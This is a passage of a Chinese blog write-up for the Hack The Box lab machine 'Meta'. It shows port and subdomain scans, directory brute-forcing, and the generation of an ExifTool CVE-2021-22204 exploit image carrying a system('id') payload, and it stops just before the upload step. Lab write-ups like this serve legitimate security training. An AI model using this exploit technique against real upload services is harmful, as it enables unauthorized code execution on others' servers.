@@ -1,0 +1,846 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：子域名枚举、CVE-2021-22204、pspy工具使用、sh脚本分析、ImageMagick 7.0.10-36 漏洞、CVE-2020-29599、环境变量 XDG_CONFIG_HOME提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Meta-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/01/30/Meta-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：子域名枚举、CVE-2021-22204、pspy工具使用、sh脚本分析、ImageMagick 7.0.10-36 漏洞、CVE-2020-29599、环境变量 XDG_CONFIG_HOME提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Meta-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Meta-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Meta-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Meta-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Meta-htb-writeup/5.png">
+<meta property="og:image" content="https://sh1yan.top/Users/shiyan/E-disk/my-blog/%E5%8D%9A%E5%AE%A2%E8%8D%89%E7%A8%BF%E6%96%87%E4%BB%B6%E5%A4%B9/Meta-htb-writeup-20240130/Meta-htb-writeup/6.png">
+<meta property="article:published_time" content="2024-01-30T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-02-07T03:39:27.116Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Meta-htb-writeup/1.png">
+  
+  
+  
+  <title>Meta-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Meta-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-30 23:50" pubdate>
+          2024年1月30日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          45k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          379 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Meta-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：子域名枚举、CVE-2021-22204、pspy工具使用、sh脚本分析、ImageMagick 7.0.10-36 漏洞、CVE-2020-29599、环境变量 XDG_CONFIG_HOME提权</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://0xdf.gitlab.io/2022/06/11/htb-meta.html</code></p>
+<p>参考链接：<code>https://siunam321.github.io/ctf/hackthebox/Meta/</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.11.140</p>
+<p>2、扫描下开放端口情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p 22,80 -sCV 10.10.11.140       <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-30 11:02 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.140<br>Host is up (0.40s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)<br>|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)<br>|_  256 05:e9:<span class="hljs-built_in">df</span>:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)<br>80/tcp open  http    Apache httpd<br>|_http-server-header: Apache<br>|_http-title: Did not follow redirect to http://artcorp.htb<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 35.09 seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、在上面获取到了一个域名信息，那接下来扫描下VHOSTS虚拟子域名情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ffuf -u http://10.10.11.140 -H <span class="hljs-string">&quot;Host: FUZZ.artcorp.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0<br><br>        /<span class="hljs-string">&#x27;___\  /&#x27;</span>___\           /<span class="hljs-string">&#x27;___\       </span><br><span class="hljs-string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="hljs-string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="hljs-string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="hljs-string">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="hljs-string">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="hljs-string"></span><br><span class="hljs-string">       v2.1.0-dev</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string"> :: Method           : GET</span><br><span class="hljs-string"> :: URL              : http://10.10.11.140</span><br><span class="hljs-string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span><br><span class="hljs-string"> :: Header           : Host: FUZZ.artcorp.htb</span><br><span class="hljs-string"> :: Follow redirects : false</span><br><span class="hljs-string"> :: Calibration      : false</span><br><span class="hljs-string"> :: Timeout          : 10</span><br><span class="hljs-string"> :: Threads          : 40</span><br><span class="hljs-string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="hljs-string"> :: Filter           : Response size: 0</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">dev01                   [Status: 200, Size: 247, Words: 16, Lines: 10, Duration: 349ms]</span><br><span class="hljs-string">:: Progress: [4989/4989] :: Job [1/1] :: 29 req/sec :: Duration: [0:01:12] :: Errors: 1 ::</span><br></code></pre></td></tr></table></figure>
+
+<p>4、我们把获取到的域名都本地绑定下hosts</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.10.11.140 artcorp.htb dev01.artcorp.htb&quot;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts<br>10.10.11.140 artcorp.htb dev01.artcorp.htb<br></code></pre></td></tr></table></figure>
+
+<p>5、我们查看下80端口的首页内容吧</p>
+<p><code>http://artcorp.htb/</code></p>
+<p><img src="http://sh1yan.top/photo/Meta-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>6、接下来扫描下目录开放情况，但是并没有什么发现。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ feroxbuster -u http://artcorp.htb<br><br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.10.1<br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http://artcorp.htb<br> 🚀  Threads               │ 50<br> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<br> 👌  Status Codes          │ All Status Codes!<br> 💥  Timeout (secs)        │ 7<br> 🦡  User-Agent            │ feroxbuster/2.10.1<br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 🔎  Extract Links         │ <span class="hljs-literal">true</span><br> 🏁  HTTP methods          │ [GET]<br> 🔃  Recursion Depth       │ 4<br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br>403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter<br>404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter<br>301      GET        7l       20w      234c http://artcorp.htb/assets =&gt; http://artcorp.htb/assets/<br>301      GET        7l       20w      238c http://artcorp.htb/assets/img =&gt; http://artcorp.htb/assets/img/<br>[<span class="hljs-comment">####################] - 7m     90006/90006   0s      found:2       errors:732    </span><br>[<span class="hljs-comment">####################] - 6m     30000/30000   77/s    http://artcorp.htb/ </span><br>[<span class="hljs-comment">####################] - 6m     30000/30000   78/s    http://artcorp.htb/assets/ </span><br>[<span class="hljs-comment">####################] - 6m     30000/30000   82/s    http://artcorp.htb/assets/img/</span><br></code></pre></td></tr></table></figure>
+
+<p>7、那就看一下子域名情况</p>
+<p><code>http://dev01.artcorp.htb/</code></p>
+<p><img src="http://sh1yan.top/photo/Meta-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>8、那就扫描下目录情况吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ feroxbuster -u http://dev01.artcorp.htb -x php<br><br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.10.1<br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http://dev01.artcorp.htb<br> 🚀  Threads               │ 50<br> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<br> 👌  Status Codes          │ All Status Codes!<br> 💥  Timeout (secs)        │ 7<br> 🦡  User-Agent            │ feroxbuster/2.10.1<br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 🔎  Extract Links         │ <span class="hljs-literal">true</span><br> 💲  Extensions            │ [php]<br> 🏁  HTTP methods          │ [GET]<br> 🔃  Recursion Depth       │ 4<br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br>403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter<br>404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter<br>200      GET        9l       24w      247c http://dev01.artcorp.htb/<br>301      GET        7l       20w      242c http://dev01.artcorp.htb/metaview =&gt; http://dev01.artcorp.htb/metaview/<br>301      GET        7l       20w      246c http://dev01.artcorp.htb/metaview/css =&gt; http://dev01.artcorp.htb/metaview/css/<br>200      GET        9l       24w      247c http://dev01.artcorp.htb/index.php<br>301      GET        7l       20w      249c http://dev01.artcorp.htb/metaview/assets =&gt; http://dev01.artcorp.htb/metaview/assets/<br>301      GET        7l       20w      246c http://dev01.artcorp.htb/metaview/lib =&gt; http://dev01.artcorp.htb/metaview/lib/<br>301      GET        7l       20w      250c http://dev01.artcorp.htb/metaview/uploads =&gt; http://dev01.artcorp.htb/metaview/uploads/<br>200      GET       33l       83w     1404c http://dev01.artcorp.htb/metaview/index.php<br>200      GET        0l        0w   155713c http://dev01.artcorp.htb/metaview/css/bootstrap.min.css<br>301      GET        7l       20w      249c http://dev01.artcorp.htb/metaview/vendor =&gt; http://dev01.artcorp.htb/metaview/vendor/<br></code></pre></td></tr></table></figure>
+
+<p>9、这里发现了一个目录，我们查看下这个目录情况</p>
+<p><code>http://dev01.artcorp.htb/metaview/</code></p>
+<p><img src="http://sh1yan.top/photo/Meta-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>10、看情况是上次图片进行分析的，我们上次个图片看下</p>
+<p><code>http://dev01.artcorp.htb/metaview/index.php</code></p>
+<p><img src="http://sh1yan.top/photo/Meta-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>11、我们发现了出现了一些信息，以往的经验来看，这个应该是使用了exiftool工具进行显示的信息，我们本地用呢个工具比对下看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ exiftool ./bg-showcase-2.jpg <br>ExifTool Version Number         : 12.70<br>File Name                       : bg-showcase-2.jpg<br>Directory                       : .<br>File Size                       : 197 kB<br>File Modification Date/Time     : 2024:01:30 11:24:37+08:00<br>File Access Date/Time           : 2024:01:30 11:24:37+08:00<br>File Inode Change Date/Time     : 2024:01:30 11:24:37+08:00<br>File Permissions                : -rw-r--r--<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>Exif Byte Order                 : Little-endian (Intel, II)<br>Quality                         : 100%<br>XMP Toolkit                     : Adobe XMP Core 5.6-c140 79.160451, 2017/05/06-01:08:21<br>Document ID                     : xmp.did:391792B7C1AC11E79FC6E0171011BB04<br>Instance ID                     : xmp.iid:391792B6C1AC11E79FC6E0171011BB04<br>Creator Tool                    : Adobe Photoshop CC 2018 Macintosh<br>Derived From Instance ID        : 30005BFC1BB16784324B782F5C8D8E08<br>Derived From Document ID        : 30005BFC1BB16784324B782F5C8D8E08<br>DCT Encode Version              : 100<br>APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling<br>APP14 Flags 1                   : (none)<br>Color Transform                 : YCbCr<br>Image Width                     : 900<br>Image Height                    : 600<br>Encoding Process                : Baseline DCT, Huffman coding<br>Bits Per Sample                 : 8<br>Color Components                : 3<br>Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)<br>Image Size                      : 900x600<br>Megapixels                      : 0.540<br></code></pre></td></tr></table></figure>
+
+<p>12、这里推测，应该是用的这个软件，我们看看这个软件有什么漏洞吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ searchsploit exiftool               <br>------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                       |  Path<br>------------------------------------------------------------------------------------- ---------------------------------<br>ExifTool 12.23 - Arbitrary Code Execution                                            | linux/local/50911.py<br>------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ searchsploit -m linux/local/50911.py<br>  Exploit: ExifTool 12.23 - Arbitrary Code Execution<br>      URL: https://www.exploit-db.com/exploits/50911<br>     Path: /usr/share/exploitdb/exploits/linux/local/50911.py<br>    Codes: CVE-2021-22204<br> Verified: False<br>File Type: Python script, ASCII text executable<br>Copied to: /home/kali/Desktop/50911.py<br></code></pre></td></tr></table></figure>
+
+<p>13、但是默认的这个工具，生成脚本有些问题，我们在github上找了同类型的脚本，我们继续生成下exp</p>
+<p><code>https://hackerone.com/reports/1154542</code></p>
+<p><code>https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</code></p>
+<p><code>https://github.com/UNICORDev/exploit-CVE-2021-22204</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop/exploit-CVE-2021-22204-main]<br>└─$ <span class="hljs-built_in">ls</span> -la<br>总计 28<br>drwx------ 2 kali kali 4096 2022年 6月 8日 .<br>drwxr-xr-x 5 kali kali 4096  1月30日 11:46 ..<br>-rw-r--r-- 1 kali kali  481 2022年 6月 8日 Dockerfile<br>-rw-r--r-- 1 kali kali 6802 2022年 6月 8日 exploit-CVE-2021-22204.py<br>-rw-r--r-- 1 kali kali   85 2022年 6月 8日 .gitignore<br>-rw-r--r-- 1 kali kali 2725 2022年 6月 8日 README.md<br><br>┌──(kali㉿offsec)-[~/Desktop/exploit-CVE-2021-22204-main]<br>└─$ sudo python exploit-CVE-2021-22204.py -c <span class="hljs-string">&#x27;id&#x27;</span><br><br>        _ __,~~~/_        __  ___  _______________  ___  ___<br>    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \<br>        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /<br>_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....<br>    <br>UNICORD: Exploit <span class="hljs-keyword">for</span> CVE-2021-22204 (ExifTool) - Arbitrary Code Execution<br>PAYLOAD: (metadata <span class="hljs-string">&quot;\c<span class="hljs-variable">$&#123;system(&#x27;id&#x27;)&#125;</span>;&quot;</span>)<br>DEPENDS: Dependencies <span class="hljs-keyword">for</span> exploit are met!<br>PREPARE: Payload written to file!<br>PREPARE: Payload file compressed!<br>PREPARE: DjVu file created!<br>PREPARE: JPEG image created/processed!<br>PREPARE: Exiftool config written to file!<br>EXPLOIT: Payload injected into image!<br>CLEANUP: Old file artifacts deleted!<br>SUCCESS: Exploit image written to <span class="hljs-string">&quot;image.jpg&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>14、我们把这个exp上传下，看看是否有漏洞显示</p>
+<p><code>http://dev01.artcorp.htb/metaview/index.php</code></p>
